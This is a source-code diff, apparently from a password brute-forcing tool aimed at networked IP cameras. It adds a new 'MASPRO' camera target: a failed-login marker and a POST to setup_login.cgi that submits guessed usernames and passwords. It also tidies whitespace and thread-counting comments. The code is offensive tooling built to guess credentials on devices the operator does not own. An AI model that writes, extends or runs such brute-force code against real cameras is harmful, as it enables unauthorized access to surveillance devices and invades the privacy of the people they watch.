@@ -53,19 +53,22 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
     {
         negVector.push_back("var check=\"0\"");
         negVector.push_back("var authLevel =\"0\";");
-    }
-    else if(strcmp(SPEC, "IEORFOREFOX") == 0)
-    {
-        negVector.push_back("AAA()");
-        negVector.push_back("РРјСЏ РёР»Рё РїР°СЂРѕР»СЊ РЅРµРІРµСЂРЅС‹Рµ!");
-        negVector.push_back("Р’РѕР·РІСЂР°С‚");
-        negVector.push_back("HTTP/1.0 302 Found");
-        negVector.push_back("is incorrect");
-    }
+	}
+	else if (strcmp(SPEC, "IEORFOREFOX") == 0)
+	{
+		negVector.push_back("AAA()");
+		negVector.push_back("РРјСЏ РёР»Рё РїР°СЂРѕР»СЊ РЅРµРІРµСЂРЅС‹Рµ!");
+		negVector.push_back("Р’РѕР·РІСЂР°С‚");
+		negVector.push_back("HTTP/1.0 302 Found");
+		negVector.push_back("is incorrect");
+	}
+	else if (strcmp(SPEC, "MASPRO") == 0)
+	{
+		negVector.push_back("action=\"setup_login.cgi\"");
+	}
     else
     {
         stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");
-
         return lps;
     };
 
@@ -128,20 +131,23 @@ lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
                 doPost = true;
                 sprintf(request, "%s:%d/rpc/login", ip, port);
                 sprintf(postData, "user=%s&password=%s", login, pass);
-            }
-            else if(strcmp(SPEC, "DVS") == 0)
-            {
-                doPost = true;
-                sprintf(request, "%s:%d/login", ip, port);
-                sprintf(postData, "langs=en&user=%s&password=%s&submit=+Login+", login, pass);
-            }
+			}
+			else if (strcmp(SPEC, "DVS") == 0)
+			{
+				doPost = true;
+				sprintf(request, "%s:%d/login", ip, port);
+				sprintf(postData, "langs=en&user=%s&password=%s&submit=+Login+", login, pass);
+			}
+			else if (strcmp(SPEC, "MASPRO") == 0)
+			{
+				doPost = true;
+				sprintf(request, "%s:%d/setup_login.cgi", ip, port);
+				sprintf(postData, "check_username=%s&check_password=%s&login=", login, pass);
+			}
 
             std::string buffer;
-            if(doPost) {
-				res = Connector::nConnect(request, port, &buffer, postData);
-            } else {
-				res = Connector::nConnect(request, port, &buffer);
-            }
+            if(doPost) res = Connector::nConnect(request, port, &buffer, postData); 
+			else res = Connector::nConnect(request, port, &buffer);
 
 			if (res == -2) return lps;
 			else if (res != -1) {
@@ -177,12 +183,10 @@ lopaStr IPC::IPCLobby(const char *ip, int port, char *SPEC) {
     if(gMaxBrutingThreads > 0) {
         while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);
 
-		//BruteUtils::BConInc();
 		++baCount;
 		++BrutingThrds;
 		lopaStr lps = IPCBrute(ip, port, SPEC);
 		--BrutingThrds;
-        //BruteUtils::BConDec();
 
         return lps;
     } else {
